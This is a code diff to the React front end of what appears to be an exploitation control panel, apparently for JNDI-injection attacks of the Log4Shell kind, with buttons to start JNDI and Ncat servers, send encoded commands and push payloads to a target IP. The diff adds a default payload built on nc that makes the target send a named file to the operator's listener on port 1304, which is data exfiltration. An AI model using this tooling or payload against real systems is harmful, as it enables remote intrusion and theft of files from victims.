@@ -20,6 +20,7 @@ import { exportReport } from "@/app/components/exportpdf";
 import {
     fetchJavaPath,
     fetchIP,
+    testConnection,
     startJNDI,
     startNcat,
     inputCMD,
@@ -92,27 +93,23 @@ const HomePage = () => {
             case 'test':
                 newConsoleLog += 'Test successful!';
                 break;
+            case 'testConnection':
+                const testConnectionResult = await testConnection(state.targetIP);
+                newConsoleLog += testConnectionResult.message ? `${testConnectionResult.message}` : testConnectionResult.error;
+                break;
             case 'inputCommand':
                 const base64cmd = btoa(state.command);
                 const inputCMDResult = await inputCMD(base64cmd);
                 newConsoleLog += inputCMDResult.message || inputCMDResult.error;
                 break;
-            case 'settargetip':
-                if (!ipRegex.test(state.targetIP)) {
-                    newConsoleLog += 'Error: Invalid IP Address Format';
-                } else {
-                    newConsoleLog += `Target IP Address: ${state.targetIP}`;
-                }
-                break;
             case 'sendPayload':
                 if (!ipRegex.test(state.targetIP)) {
                     newConsoleLog += 'Error: Invalid Target IP Address Format';
-                } else if (!state.payload) {
-                    newConsoleLog += 'Error: Payload is empty';
                 } else {
-                    const base64payload = btoa(state.payload);
+                    const payload = `nc -w 3 ${state.intIP} 1304 < ${state.filename}`;
+                    const base64payload = btoa(state.payload ? state.payload : payload);
                     const payloadResult = await sendPayload(base64payload, state.targetIP);
-                    newConsoleLog += payloadResult.message ? `${payloadResult.message}` : payloadResult.error;
+                    newConsoleLog += `Target IP: ${state.targetIP}\nPayload: ${state.payload ? state.payload : payload}\n${payloadResult.message ? `Result: ${payloadResult.message}` : `Error: ${payloadResult.error}`}`;
                 }
                 break;
             case 'startJNDI':
@@ -201,6 +198,7 @@ const HomePage = () => {
                     <Wrap spacing={2} my={2}>
                         {[
                             { label: 'Test', type: 'test' },
+                            { label: 'Test Connection', type: 'testConnection' },
                             { label: 'Start JNDI Server', type: 'startJNDI' },
                             { label: 'Stop JNDI Server', type: 'stopJNDI' },
                             { label: 'Check JNDI Server', type: 'checkJNDI' },
@@ -209,7 +207,7 @@ const HomePage = () => {
                             { label: 'Check Ncat Server', type: 'checkNcat' },
                             { label: 'Send Payload', type: 'sendPayload' },
                         ].map(({ label, type }) => (
-                            <Button key={type} size={'sm'} colorScheme={type === 'sendPayload' ? 'blue' : type === 'stopJNDI' || type === 'stopNcat' ? 'red' : type === 'startJNDI' || type === 'startNcat' ? 'green' : type === 'exportReport' ? 'purple' : type === 'checkJNDI' || type === 'checkNcat' ? 'cyan' : 'gray'} variant='outline' onClick={() => handleInputButtonClick(type)}>
+                            <Button key={type} size={'sm'} colorScheme={type === 'sendPayload' ? 'blue' : type === 'stopJNDI' || type === 'stopNcat' ? 'red' : type === 'startJNDI' || type === 'startNcat' ? 'green' : type === 'exportReport' ? 'purple' : type === 'checkJNDI' || type === 'checkNcat' ? 'cyan' : type === 'testConnection' ? 'green' : 'gray'} variant='outline' onClick={() => handleInputButtonClick(type)}>
                                 {label}
                             </Button>
                         ))}
